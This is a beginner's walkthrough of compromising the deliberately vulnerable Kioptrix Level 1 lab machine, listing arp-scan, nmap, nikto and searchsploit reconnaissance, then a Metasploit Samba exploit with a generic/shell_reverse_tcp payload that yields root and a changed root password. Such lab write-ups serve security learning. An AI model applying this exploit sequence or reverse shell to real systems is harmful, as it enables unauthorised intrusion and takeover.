First of all downlaod Kiotrix Level No.1 Machine from offical website. Here is the link: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ Then add into virtual box and run the machine. 

![image](https://github.com/user-attachments/assets/25f48bed-51bb-48e9-95c4-b4c025957e9a)


<div align=center>

Then type arp-scan –l into kali linux terminal
  
![image](https://github.com/user-attachments/assets/1d1ac0e9-0493-4bee-a887-17f7bb8b8b51)

</div>


By above command I got the IP of target machine. Then I use nmap to get further details about target and run nmap –A Target_IP. I got some ports which are opened. Such as I take to deep dive into samba 139/TCP 


![image](https://github.com/user-attachments/assets/b2ceebda-a67d-4bf9-9674-5d414158f442)


Then I type target IP for confirmation or if any possible way to capture any further useful information. When I added /etc to last of address I got nothing. 

![image](https://github.com/user-attachments/assets/a49e3977-5607-4e6a-817e-94cebc69bd4f)


<div align=center>
  
Nikto –h http://192.68.0.110
</div>


![image](https://github.com/user-attachments/assets/c8dc38d3-67fd-4394-b7b5-1c3bea35202a)

Nikto help to figure what vulnerability can be exploited in the target machine. I came to know that reverse shell for remote access can be achieved.  

![image](https://github.com/user-attachments/assets/d0bc167e-1fe1-4e83-9640-2c3d6aa13ec1)

I opened metaspolit framework by typing msfconsole into the terminal. Then seach for the exploit by typing searchsploit samba and above list is there…

![image](https://github.com/user-attachments/assets/52da1b0b-b50d-4d8a-a5bb-9799402d76bc)

 
Type use 22 because only samba exploit with linux. As can be seen in the next to above screenshot. RHost is not added. Let’s do it!

![image](https://github.com/user-attachments/assets/b5e2be09-f241-479e-af51-cb3766129d76)
 
set rhost target_IP
rhost has been set. Now check by typing options. As can bee seen above.

![image](https://github.com/user-attachments/assets/c137d366-c89f-4f1c-bec4-17c427c10573)
 
Now I type payload and here is the list but from nikto hint was given so as in the screenshot highlighted payload will be used. It time to load it.
Be remind as I made mistake that I copied the payload and paste it but gave error. First remove slash between payload and generic then only give space. 

![image](https://github.com/user-attachments/assets/45ac11ee-d19f-4c1f-8547-9b92bc5e62ca)


set payload generic/shell_reverse_tcp
The payload has been loaded now I typed run And payload is running and creating session with target machine. Finally the session has been established. I typed whoami for confirmation that Did I get root account or not. As in the above screenshot it been seen I achieve my goal. Now Simply I typed passwd for change password as this command can only be run in root account. As I had root account I changed password of target machine into 1234 

![image](https://github.com/user-attachments/assets/46d047c0-e9a5-4f1c-beae-400f5c89b6ea)
 
Final step to check Kioptrix Level # 01 has been opened I typed root as username and 1234 in the password which I added as new password. I have been login into the root account.
